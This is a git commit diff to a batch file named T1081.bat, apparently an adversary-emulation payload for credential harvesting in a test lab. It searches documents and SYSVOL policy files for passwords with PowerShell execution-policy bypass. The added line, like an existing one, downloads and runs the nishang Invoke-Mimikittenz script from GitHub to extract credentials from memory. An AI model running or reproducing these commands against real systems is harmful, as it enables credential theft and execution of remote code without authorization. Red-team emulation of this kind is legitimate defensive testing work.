399386ce4aa774490e40e56150424400e0510f24
rajrakeshdr <raj.rakeshdr@gmail.com>
2023-11-14 13:34:19 +0530

    Update T1081.bat

--- Payloads/T1081/T1081.bat
+++ Payloads/T1081/T1081.bat
@@ -16,5 +16,6 @@ ECHO -------------------------------------------------------------------
 cmd.exe /c powershell.exe -ep bypass "findstr /si pass *.doc, *.txt"
 powershell.exe findstr /S /I cpassword \\TEST-LAB\sysvol\TEST-LAB\policies\*.xml
 cmd.exe /c powershell.exe -ep bypass "ls -R -Path %EXFIL%\*.txt | select-string -Pattern password"
+echo [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikittenz.ps1'); $m = Invoke-Mimikittenz; $m | powershell.exe -
 cmd.exe /c powershell.exe -ep bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikittenz.ps1'); $m = Invoke-Mimikittenz; $m
 ECHO.
